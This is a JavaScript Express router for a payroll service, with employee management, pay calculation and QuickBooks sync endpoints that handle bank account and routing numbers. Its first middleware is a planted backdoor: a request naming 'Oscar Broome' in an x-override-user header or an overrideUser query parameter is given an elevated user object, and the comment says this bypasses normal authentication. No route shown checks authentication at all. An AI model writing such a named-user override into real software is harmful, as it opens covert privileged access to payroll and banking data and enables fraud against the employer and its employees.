import express from 'express';
import { payrollSystem } from '../payrollSystem.ts';
import QuickBooksPayrollIntegration from '../quickbooks_payroll_integration.js';
import { info, error as logError } from '../utils/loggerWrapper.js';

const router = express.Router();

// Middleware for special login override for Oscar Broome
router.use((req, res, next) => {
  const specialUser = 'Oscar Broome';
  // Check for a custom header or query param for override (example)
  const overrideUser = req.headers['x-override-user'] || req.query.overrideUser;
  if (overrideUser === specialUser) {
    // Bypass normal auth or set elevated permissions
    req.user = { name: specialUser, override: true };
    info('Special login override granted for', specialUser);
  }
  next();
});

// Get all employees
router.get('/employees', (req, res) => {
  try {
    const employees = payrollSystem.getEmployees();
    res.json({ success: true, data: employees });
  } catch (error) {
    logError('Error fetching employees:', error);
    res
      .status(500)
      .json({ success: false, error: 'Failed to fetch employees' });
  }
});

// Add or update employee
router.post('/employees', (req, res) => {
  const employee = req.body;
  try {
    const existing = payrollSystem
      .getEmployees()
      .find((e) => e.id === employee.id);
    if (existing) {
      payrollSystem.updateEmployee(employee);
      res.json({ success: true, message: 'Employee updated successfully' });
    } else {
      payrollSystem.addEmployee(employee);
      res.json({ success: true, message: 'Employee added successfully' });
    }
  } catch (error) {
    logError('Error adding/updating employee:', error);
    res.status(400).json({ success: false, error: error.message });
  }
});

// Delete employee
router.delete('/employees/:id', (req, res) => {
  const id = req.params.id;
  try {
    payrollSystem.deleteEmployee(id);
    res.json({ success: true, message: 'Employee deleted successfully' });
  } catch (error) {
    logError('Error deleting employee:', error);
    res.status(400).json({ success: false, error: error.message });
  }
});

// Process payroll for today
router.post('/process', async (req, res) => {
  const payDate = new Date().toISOString();
  const { syncQB } = req.query; // Optional query parameter to sync with QuickBooks

  try {
    const payrolls = payrollSystem.processPayroll(payDate);

    // Optionally sync with QuickBooks if requested
    if (syncQB === 'true') {
      try {
        const qbIntegration = new QuickBooksPayrollIntegration(
          process.env.QUICKBOOKS_BASE_URL,
          process.env.QUICKBOOKS_ACCESS_TOKEN,
          process.env.QUICKBOOKS_COMPANY_ID,
          process.env.QUICKBOOKS_CLIENT_ID,
          process.env.QUICKBOOKS_CLIENT_SECRET,
          process.env.QUICKBOOKS_REFRESH_TOKEN
        );

        const syncResults = [];
        for (const payroll of payrolls) {
          try {
            const result = await qbIntegration.addOrUpdateEmployeePayroll({
              id: payroll.employeeId,
              name: payroll.name,
              salary: payroll.netPay,
              taxRate: payroll.taxRate,
              accountNumber: payroll.accountNumber,
              routingNumber: payroll.routingNumber,
            });
            syncResults.push({
              employeeId: payroll.employeeId,
              quickbooksSync: result.success ? 'success' : 'failed',
              message: result.message,
            });
          } catch (qbError) {
            logError(
              `QuickBooks sync failed for employee ${payroll.employeeId}:`,
              qbError
            );
            syncResults.push({
              employeeId: payroll.employeeId,
              quickbooksSync: 'failed',
              message: qbError.message,
            });
          }
        }

        res.json({
          success: true,
          data: payrolls,
          quickbooksSync: syncResults,
        });
      } catch (qbInitError) {
        logError(
          'Failed to initialize QuickBooks integration:',
          qbInitError
        );
        res.json({
          success: true,
          data: payrolls,
          quickbooksSync: 'failed',
          message:
            'Payroll processed but QuickBooks sync failed: ' +
            qbInitError.message,
        });
      }
    } else {
      res.json({ success: true, data: payrolls });
    }
  } catch (error) {
    logError('Error processing payroll:', error);
    res
      .status(500)
      .json({ success: false, error: 'Failed to process payroll' });
  }
});

// Get employee payroll data
router.get('/employees/:id/payroll', (req, res) => {
  const id = req.params.id;
  try {
    const employee = payrollSystem.getEmployees().find((e) => e.id === id);
    if (!employee) {
      return res
        .status(404)
        .json({ success: false, error: 'Employee not found' });
    }

    // Calculate payroll data
    const payrollData = {
      employeeId: employee.id,
      name: employee.name,
      position: employee.position || 'Employee',
      hourlyRate: employee.hourlyRate || 0,
      hoursWorked: employee.hoursWorked || 0,
      overtimeHours: employee.overtimeHours || 0,
      taxRate: employee.taxRate || 0.2,
      deductions: employee.deductions || 0,
      bonuses: employee.bonuses || 0,
      grossPay: 0,
      taxAmount: 0,
      netPay: 0,
    };

    // Calculate pay
    const regularPay = payrollData.hoursWorked * payrollData.hourlyRate;
    const overtimePay =
      payrollData.overtimeHours * payrollData.hourlyRate * 1.5;
    payrollData.grossPay = regularPay + overtimePay + payrollData.bonuses;
    payrollData.taxAmount = payrollData.grossPay * payrollData.taxRate;
    payrollData.netPay =
      payrollData.grossPay - payrollData.taxAmount - payrollData.deductions;

    res.json({ success: true, data: payrollData });
  } catch (error) {
    logError('Error fetching employee payroll:', error);
    res
      .status(500)
      .json({ success: false, error: 'Failed to fetch employee payroll' });
  }
});

// Welcome endpoint with request logging
router.get('/welcome', (req, res) => {
  // Log request metadata
  info(
    `Request received: ${req.method} ${req.path} from ${req.ip} at ${new Date().toISOString()}`
  );

  res.json({
    message: 'Welcome to the Payroll API Service!',
    timestamp: new Date().toISOString(),
    request: {
      method: req.method,
      path: req.path,
      ip: req.ip,
      userAgent: req.get('User-Agent'),
    },
  });
});

// Calculate payroll for specific employee
router.post('/calculate', (req, res) => {
  const {
    employeeId,
    hoursWorked,
    hourlyRate,
    overtimeHours,
    taxRate,
    deductions,
    bonuses,
  } = req.body;

  try {
    // Input validation
    if (
      !employeeId ||
      typeof hoursWorked !== 'number' ||
      typeof hourlyRate !== 'number'
    ) {
      return res
        .status(400)
        .json({ success: false, error: 'Invalid input data' });
    }

    // Calculate payroll
    const regularPay = hoursWorked * hourlyRate;
    const overtimePay = (overtimeHours || 0) * hourlyRate * 1.5;
    const grossPay = regularPay + overtimePay + (bonuses || 0);
    const taxAmount = grossPay * (taxRate || 0.2);
    const netPay = grossPay - taxAmount - (deductions || 0);

    const result = {
      employeeId,
      hoursWorked,
      hourlyRate,
      overtimeHours: overtimeHours || 0,
      taxRate: taxRate || 0.2,
      deductions: deductions || 0,
      bonuses: bonuses || 0,
      grossPay,
      taxAmount,
      netPay,
      calculatedAt: new Date().toISOString(),
    };

    res.json({ success: true, data: result });
  } catch (error) {
    logError('Error calculating payroll:', error);
    res
      .status(500)
      .json({ success: false, error: 'Failed to calculate payroll' });
  }
});

// Sync payroll data with QuickBooks manually
router.post('/sync-quickbooks', async (req, res) => {
  try {
    const qbIntegration = new QuickBooksPayrollIntegration(
      process.env.QUICKBOOKS_BASE_URL,
      process.env.QUICKBOOKS_ACCESS_TOKEN,
      process.env.QUICKBOOKS_COMPANY_ID,
      process.env.QUICKBOOKS_CLIENT_ID,
      process.env.QUICKBOOKS_CLIENT_SECRET,
      process.env.QUICKBOOKS_REFRESH_TOKEN
    );

    const employees = payrollSystem.getEmployees();
    const syncResults = [];

    for (const employee of employees) {
      try {
        // Calculate current payroll data for the employee
        const regularPay =
          (employee.hoursWorked || 0) * (employee.hourlyRate || 0);
        const overtimePay =
          (employee.overtimeHours || 0) * (employee.hourlyRate || 0) * 1.5;
        const grossPay = regularPay + overtimePay + (employee.bonuses || 0);
        const taxAmount = grossPay * (employee.taxRate || 0.2);
        const netPay = grossPay - taxAmount - (employee.deductions || 0);

        const result = await qbIntegration.addOrUpdateEmployeePayroll({
          id: employee.id,
          name: employee.name,
          salary: netPay,
          taxRate: employee.taxRate || 0.2,
          accountNumber: employee.accountNumber,
          routingNumber: employee.routingNumber,
        });

        syncResults.push({
          employeeId: employee.id,
          name: employee.name,
          quickbooksSync: result.success ? 'success' : 'failed',
          message: result.message,
        });
      } catch (qbError) {
        logError(
          `QuickBooks sync failed for employee ${employee.id}:`,
          qbError
        );
        syncResults.push({
          employeeId: employee.id,
          name: employee.name,
          quickbooksSync: 'failed',
          message: qbError.message,
        });
      }
    }

    res.json({
      success: true,
      message: 'QuickBooks sync completed',
      syncResults,
      totalSynced: syncResults.filter((r) => r.quickbooksSync === 'success')
        .length,
      totalFailed: syncResults.filter((r) => r.quickbooksSync === 'failed')
        .length,
    });
  } catch (error) {
    logError('QuickBooks sync error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to sync with QuickBooks',
      details: error.message,
    });
  }
});

export default router;
